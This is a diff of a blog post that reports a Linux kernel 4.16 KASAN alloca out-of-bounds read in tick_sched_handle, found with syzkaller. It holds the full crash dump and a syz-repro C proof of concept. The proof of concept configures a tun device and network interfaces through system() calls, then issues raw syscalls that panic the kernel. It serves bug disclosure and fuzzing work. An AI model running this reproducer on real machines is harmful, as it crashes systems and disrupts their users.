@@ -1,27 +1,25 @@
 ---
 layout: post
-title: LK v4.16.x - handle_irq - oobs
+title: LK v4.16.x - tick_sched_time/handle - oobs
 ---
 
-handle_irq - alloca Out Of Bounds
+tick_sched_time/handle - alloca Out Of Bounds
 
 posted & found by [zer0day](https://kozistr.github.io/)
 
 ## tl;dr
 
-Found in LK v4.16.0-rc3. Only Call Trace (Dump).
-
-Another meaningless one :)
+Got from syzkaller & Found in LK v4.16.0-rc2~. Only Call Trace (Dump).
 
 ## Call Trace (Dump)
 
 Here's a dump.
 
 ```c
-BUG: KASAN: alloca-out-of-bounds in handle_irq+0x218/0x2f3
-Read of size 8 at addr ffff88007b086240 by task syzkaller734473/2831
+BUG: KASAN: alloca-out-of-bounds in tick_sched_handle+0x165/0x180
+Read of size 8 at addr ffff880022ba7030 by task syz-executor5/3160
 
-CPU: 0 PID: 2831 Comm: syzkaller734473 Not tainted 4.16.0-rc3+ #2
+CPU: 0 PID: 3160 Comm: syz-executor5 Not tainted 4.16.0-rc2+ #2
 Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014
 Call Trace:
  <IRQ>
@@ -31,23 +29,23 @@ Call Trace:
  </IRQ>
 
 The buggy address belongs to the page:
-page:ffffea0001ec2180 count:0 mapcount:0 mapping:0000000000000000 index:0xffff88007b087dd0
-flags: 0x500000000000000()
-raw: 0500000000000000 0000000000000000 ffff88007b087dd0 00000000ffffffff
-raw: 0000000000000000 dead000000000200 0000000000000000 0000000000000000
+page:ffffea00008ae9c0 count:0 mapcount:0 mapping:          (null) index:0x0
+flags: 0x100000000000000()
+raw: 0100000000000000 0000000000000000 0000000000000000 00000000ffffffff
+raw: 0000000000000000 ffffea00008ae9e0 0000000000000000 0000000000000000
 page dumped because: kasan: bad access detected
 
 Memory state around the buggy address:
- ffff88007b086100: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
- ffff88007b086180: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
->ffff88007b086200: 00 00 00 00 00 00 00 00 cb cb cb cb 00 00 00 00
-                                           ^
- ffff88007b086280: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
- ffff88007b086300: 00 f1 f1 f1 f1 02 f2 f2 f2 f2 f2 f2 f2 00 00 00
+ ffff880022ba6f00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+ ffff880022ba6f80: 00 00 00 00 00 00 00 00 00 00 00 00 ca ca ca ca
+>ffff880022ba7000: 02 cb cb cb cb cb cb cb 00 00 00 00 00 00 00 00
+                                     ^
+ ffff880022ba7080: 00 00 00 00 00 00 00 00 00 00 00 00 00 f1 f1 f1
+ ffff880022ba7100: f1 02 f2 f2 f2 f2 f2 f2 f2 00 00 00 f2 f2 f2 f2
 ==================================================================
 Kernel panic - not syncing: panic_on_warn set ...
 
-CPU: 0 PID: 2831 Comm: syzkaller734473 Tainted: G    B            4.16.0-rc3+ #2
+CPU: 0 PID: 3160 Comm: syz-executor5 Tainted: G    B            4.16.0-rc2+ #2
 Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014
 Call Trace:
  <IRQ>
@@ -58,11 +56,57 @@ Call Trace:
  </IRQ>
 Dumping ftrace buffer:
    (ftrace buffer empty)
-Kernel Offset: 0x26800000 from 0xffffffff81000000 (relocation range: 0xffffffff80000000-0xffffffffbfffffff)
+Kernel Offset: 0x8e00000 from 0xffffffff81000000 (relocation range: 0xffffffff80000000-0xffffffffbfffffff)
+Rebooting in 86400 seconds..
+2018/02/24 05:33:21 reproducing crash 'KASAN: alloca-out-of-bounds Read in tick_sched_handle': final repro crashed as (corrupted=false):
+==================================================================
+BUG: KASAN: alloca-out-of-bounds in tick_sched_handle+0x165/0x180
+Read of size 8 at addr ffff880022ba7030 by task syz-executor5/3160
+
+CPU: 0 PID: 3160 Comm: syz-executor5 Not tainted 4.16.0-rc2+ #2
+Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014
+Call Trace:
+ <IRQ>
+ dump_stack+0x127/0x213
+ print_address_description+0x60/0x22b
+ kasan_report.cold.6+0xac/0x2f4
+ </IRQ>
+
+The buggy address belongs to the page:
+page:ffffea00008ae9c0 count:0 mapcount:0 mapping:          (null) index:0x0
+flags: 0x100000000000000()
+raw: 0100000000000000 0000000000000000 0000000000000000 00000000ffffffff
+raw: 0000000000000000 ffffea00008ae9e0 0000000000000000 0000000000000000
+page dumped because: kasan: bad access detected
+
+Memory state around the buggy address:
+ ffff880022ba6f00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+ ffff880022ba6f80: 00 00 00 00 00 00 00 00 00 00 00 00 ca ca ca ca
+>ffff880022ba7000: 02 cb cb cb cb cb cb cb 00 00 00 00 00 00 00 00
+                                     ^
+ ffff880022ba7080: 00 00 00 00 00 00 00 00 00 00 00 00 00 f1 f1 f1
+ ffff880022ba7100: f1 02 f2 f2 f2 f2 f2 f2 f2 00 00 00 f2 f2 f2 f2
+==================================================================
+Kernel panic - not syncing: panic_on_warn set ...
+
+CPU: 0 PID: 3160 Comm: syz-executor5 Tainted: G    B            4.16.0-rc2+ #2
+Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014
+Call Trace:
+ <IRQ>
+ dump_stack+0x127/0x213
+ panic+0x1f8/0x46f
+ kasan_end_report+0x43/0x49
+ kasan_report.cold.6+0xc8/0x2f4
+ </IRQ>
+Dumping ftrace buffer:
+   (ftrace buffer empty)
+Kernel Offset: 0x8e00000 from 0xffffffff81000000 (relocation range: 0xffffffff80000000-0xffffffffbfffffff)
 Rebooting in 86400 seconds..
 ```
 
 ## PoC
+
+generated by syz-repro.
 
 ```c
 #define _GNU_SOURCE
@@ -80,19 +124,29 @@ Rebooting in 86400 seconds..
 #include <sys/prctl.h>
 #include <dirent.h>
 #include <sys/mount.h>
+#include <arpa/inet.h>
 #include <errno.h>
-#include <sched.h>
-#include <signal.h>
+#include <fcntl.h>
+#include <linux/if.h>
+#include <linux/if_ether.h>
+#include <linux/if_tun.h>
+#include <linux/ip.h>
+#include <linux/tcp.h>
+#include <net/if_arp.h>
 #include <stdarg.h>
 #include <stdbool.h>
 #include <stdio.h>
-#include <sys/prctl.h>
-#include <sys/resource.h>
-#include <sys/time.h>
-#include <sys/wait.h>
+#include <stdlib.h>
+#include <sys/ioctl.h>
+#include <sys/stat.h>
+#include <sys/uio.h>
 #include <linux/net.h>
 #include <netinet/in.h>
 #include <sys/socket.h>
+#include <fcntl.h>
+#include <stdio.h>
+#include <sys/ioctl.h>
+#include <sys/stat.h>
 
 __attribute__((noreturn)) static void doexit(int status)
 {
@@ -155,56 +209,165 @@ static void use_temporary_dir()
 		fail("failed to chdir");
 }
 
-static void loop();
-
-static void sandbox_common()
+static void vsnprintf_check(char* str, size_t size, const char* format, va_list args)
 {
-	prctl(PR_SET_PDEATHSIG, SIGKILL, 0, 0, 0);
-	setpgrp();
-	setsid();
+	int rv;
 
-	struct rlimit rlim;
-	rlim.rlim_cur = rlim.rlim_max = 128 << 20;
-	setrlimit(RLIMIT_AS, &rlim);
-	rlim.rlim_cur = rlim.rlim_max = 8 << 20;
-	setrlimit(RLIMIT_MEMLOCK, &rlim);
-	rlim.rlim_cur = rlim.rlim_max = 1 << 20;
-	setrlimit(RLIMIT_FSIZE, &rlim);
-	rlim.rlim_cur = rlim.rlim_max = 1 << 20;
-	setrlimit(RLIMIT_STACK, &rlim);
-	rlim.rlim_cur = rlim.rlim_max = 0;
-	setrlimit(RLIMIT_CORE, &rlim);
+	rv = vsnprintf(str, size, format, args);
+	if (rv < 0)
+		fail("tun: snprintf failed");
+	if ((size_t)rv >= size)
+		fail("tun: string '%s...' doesn't fit into buffer", str);
+}
 
-#define CLONE_NEWCGROUP 0x02000000
+static void snprintf_check(char* str, size_t size, const char* format, ...)
+{
+	va_list args;
 
-	if (unshare(CLONE_NEWNS)) {
+	va_start(args, format);
+	vsnprintf_check(str, size, format, args);
+	va_end(args);
+}
+
+#define COMMAND_MAX_LEN 128
+#define PATH_PREFIX "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin "
+#define PATH_PREFIX_LEN (sizeof(PATH_PREFIX) - 1)
+
+static void execute_command(bool panic, const char* format, ...)
+{
+	va_list args;
+	char command[PATH_PREFIX_LEN + COMMAND_MAX_LEN];
+	int rv;
+
+	va_start(args, format);
+	memcpy(command, PATH_PREFIX, PATH_PREFIX_LEN);
+	vsnprintf_check(command + PATH_PREFIX_LEN, COMMAND_MAX_LEN, format, args);
+	rv = system(command);
+	if (panic && rv != 0)
+		fail("tun: command \"%s\" failed with code %d", &command[0], rv);
+
+	va_end(args);
+}
+
+static int tunfd = -1;
+static int tun_frags_enabled;
+
+#define SYZ_TUN_MAX_PACKET_SIZE 1000
+
+#define TUN_IFACE "syz_tun"
+
+#define LOCAL_MAC "aa:aa:aa:aa:aa:aa"
+#define REMOTE_MAC "aa:aa:aa:aa:aa:bb"
+
+#define LOCAL_IPV4 "172.20.20.170"
+#define REMOTE_IPV4 "172.20.20.187"
+
+#define LOCAL_IPV6 "fe80::aa"
+#define REMOTE_IPV6 "fe80::bb"
+
+#define IFF_NAPI 0x0010
+#define IFF_NAPI_FRAGS 0x0020
+
+static void initialize_tun(void)
+{
+	tunfd = open("/dev/net/tun", O_RDWR | O_NONBLOCK);
+	if (tunfd == -1) {
+		printf("tun: can't open /dev/net/tun: please enable CONFIG_TUN=y\n");
+		printf("otherwise fuzzing or reproducing might not work as intended\n");
+		return;
 	}
-	if (unshare(CLONE_NEWIPC)) {
+	const int kTunFd = 252;
+	if (dup2(tunfd, kTunFd) < 0)
+		fail("dup2(tunfd, kTunFd) failed");
+	close(tunfd);
+	tunfd = kTunFd;
+
+	struct ifreq ifr;
+	memset(&ifr, 0, sizeof(ifr));
+	strncpy(ifr.ifr_name, TUN_IFACE, IFNAMSIZ);
+	ifr.ifr_flags = IFF_TAP | IFF_NO_PI | IFF_NAPI | IFF_NAPI_FRAGS;
+	if (ioctl(tunfd, TUNSETIFF, (void*)&ifr) < 0) {
+		ifr.ifr_flags = IFF_TAP | IFF_NO_PI;
+		if (ioctl(tunfd, TUNSETIFF, (void*)&ifr) < 0)
+			fail("tun: ioctl(TUNSETIFF) failed");
 	}
-	if (unshare(CLONE_NEWCGROUP)) {
-	}
-	if (unshare(CLONE_NEWUTS)) {
-	}
-	if (unshare(CLONE_SYSVSEM)) {
+	if (ioctl(tunfd, TUNGETIFF, (void*)&ifr) < 0)
+		fail("tun: ioctl(TUNGETIFF) failed");
+	tun_frags_enabled = (ifr.ifr_flags & IFF_NAPI_FRAGS) != 0;
+
+	execute_command(1, "sysctl -w net.ipv6.conf.%s.accept_dad=0", TUN_IFACE);
+
+	execute_command(1, "sysctl -w net.ipv6.conf.%s.router_solicitations=0", TUN_IFACE);
+
+	execute_command(1, "ip link set dev %s address %s", TUN_IFACE, LOCAL_MAC);
+	execute_command(1, "ip addr add %s/24 dev %s", LOCAL_IPV4, TUN_IFACE);
+	execute_command(1, "ip -6 addr add %s/120 dev %s", LOCAL_IPV6, TUN_IFACE);
+	execute_command(1, "ip neigh add %s lladdr %s dev %s nud permanent",
+			REMOTE_IPV4, REMOTE_MAC, TUN_IFACE);
+	execute_command(1, "ip -6 neigh add %s lladdr %s dev %s nud permanent",
+			REMOTE_IPV6, REMOTE_MAC, TUN_IFACE);
+	execute_command(1, "ip link set dev %s up", TUN_IFACE);
+}
+
+#define DEV_IPV4 "172.20.20.%d"
+#define DEV_IPV6 "fe80::%02hx"
+#define DEV_MAC "aa:aa:aa:aa:aa:%02hx"
+
+static void initialize_netdevices(void)
+{
+	unsigned i;
+	const char* devtypes[] = {"ip6gretap", "bridge", "vcan", "bond", "veth"};
+	const char* devnames[] = {"lo", "sit0", "bridge0", "vcan0", "tunl0",
+				  "gre0", "gretap0", "ip_vti0", "ip6_vti0",
+				  "ip6tnl0", "ip6gre0", "ip6gretap0",
+				  "erspan0", "bond0", "veth0", "veth1"};
+
+	for (i = 0; i < sizeof(devtypes) / (sizeof(devtypes[0])); i++)
+		execute_command(0, "ip link add dev %s0 type %s", devtypes[i], devtypes[i]);
+	execute_command(0, "ip link add dev veth1 type veth");
+	for (i = 0; i < sizeof(devnames) / (sizeof(devnames[0])); i++) {
+		char addr[32];
+		snprintf_check(addr, sizeof(addr), DEV_IPV4, i + 10);
+		execute_command(0, "ip -4 addr add %s/24 dev %s", addr, devnames[i]);
+		snprintf_check(addr, sizeof(addr), DEV_IPV6, i + 10);
+		execute_command(0, "ip -6 addr add %s/120 dev %s", addr, devnames[i]);
+		snprintf_check(addr, sizeof(addr), DEV_MAC, i + 10);
+		execute_command(0, "ip link set dev %s address %s", devnames[i], addr);
+		execute_command(0, "ip link set dev %s up", devnames[i]);
 	}
 }
 
-static int do_sandbox_none(void)
+static int read_tun(char* data, int size)
 {
-	if (unshare(CLONE_NEWPID)) {
-	}
-	int pid = fork();
-	if (pid < 0)
-		fail("sandbox fork failed");
-	if (pid)
-		return pid;
+	if (tunfd < 0)
+		return -1;
 
-	sandbox_common();
-	if (unshare(CLONE_NEWNET)) {
+	int rv = read(tunfd, data, size);
+	if (rv < 0) {
+		if (errno == EAGAIN)
+			return -1;
+		if (errno == EBADFD)
+			return -1;
+		fail("tun: read failed with %d", rv);
 	}
+	return rv;
+}
 
-	loop();
-	doexit(1);
+static void flush_tun()
+{
+	char data[SYZ_TUN_MAX_PACKET_SIZE];
+	while (read_tun(&data[0], sizeof(data)) != -1)
+		;
+}
+
+static uintptr_t syz_open_pts(uintptr_t a0, uintptr_t a1)
+{
+	int ptyno = 0;
+	if (ioctl(a0, TIOCGPTN, &ptyno))
+		return -1;
+	char buf[128];
+	sprintf(buf, "/dev/pts/%d", ptyno);
+	return open(buf, a1, 0);
 }
 
 #define XT_TABLE_SIZE 1536
@@ -666,6 +829,7 @@ void loop()
 			setpgrp();
 			if (chdir(cwdbuf))
 				fail("failed to chdir");
+			flush_tun();
 			test();
 			doexit(0);
 		}
@@ -689,33 +853,58 @@ void loop()
 	}
 }
 
-uint64_t procid;
+uint64_t r[3] = {0xffffffffffffffff, 0xffffffffffffffff, 0xffffffffffffffff};
 void test()
 {
-	syscall(__NR_pipe2, 0x20000040, 0x4000);
+	long res;memcpy((void*)0x20000280, "/dev/loop-control", 18);
+	syscall(__NR_openat, 0xffffffffffffff9c, 0x20000280, 0x4000, 0);
+	*(uint64_t*)0x20000180 = 0;
+	*(uint64_t*)0x20000188 = 0;
+	*(uint64_t*)0x20000190 = 0;
+	*(uint64_t*)0x20000198 = 0;
+	syscall(__NR_timer_settime, 0, 0, 0x20000180, 0);
+	*(uint64_t*)0x20000500 = 0x77359400;
+	*(uint64_t*)0x20000508 = 0;
+	*(uint64_t*)0x20000510 = 0;
+	*(uint64_t*)0x20000518 = 0x989680;
+	syscall(__NR_timer_settime, 0, 0, 0x20000500, 0x20000540);
+	res = syz_open_pts(-1, 0x42100);
+	if (res != -1)
+		r[0] = res;
+	syscall(__NR_ioctl, r[0], 0x5462, 0x20000140);
+	syscall(__NR_ioctl, r[0], 0x80084504, 0x200002c0);
+	res = syscall(__NR_pipe2, 0x20000000, 0);
+	if (res != -1) {
+	r[1] = *(uint32_t*)0x20000000;
+	r[2] = *(uint32_t*)0x20000004;
+	}
+	*(uint16_t*)0x20000040 = -1;
+	*(uint16_t*)0x20000042 = 0x200;
+	*(uint16_t*)0x20000044 = 0x8000;
+	*(uint16_t*)0x20000046 = 0x3f;
+	*(uint16_t*)0x20000048 = 0x22;
+	*(uint16_t*)0x2000004a = 0x45f;
+	syscall(__NR_ioctl, r[1], 0x560a, 0x20000040);
+	syscall(__NR_fstatfs, r[1], 0x200000c0);
+	syz_open_pts(r[2], 0);
+	*(uint32_t*)0x20000340 = 0x10;
+	syscall(__NR_accept, r[2], 0x20000300, 0x20000340);
+	syscall(__NR_fcntl, r[2], 4, 0x40400);
 }
 
 int main()
 {
 	syscall(__NR_mmap, 0x20000000, 0x1000000, 3, 0x32, -1, 0);
 	char *cwd = get_current_dir_name();
-	for (procid = 0; procid < 8; procid++) {
-		if (fork() == 0) {
-			for (;;) {
-				if (chdir(cwd))
-					fail("failed to chdir");
-				use_temporary_dir();
-				int pid = do_sandbox_none();
-				int status = 0;
-				while (waitpid(pid, &status, __WALL) != pid) {}
-			}
-		}
+	for (;;) {
+		if (chdir(cwd))
+			fail("failed to chdir");
+		use_temporary_dir();
+		initialize_tun();
+		initialize_netdevices();
+		loop();
 	}
-	sleep(1000000);
-	return 0;
 }
 ```
-
-funny, just one call, ```pipe2```.
 
 **End**
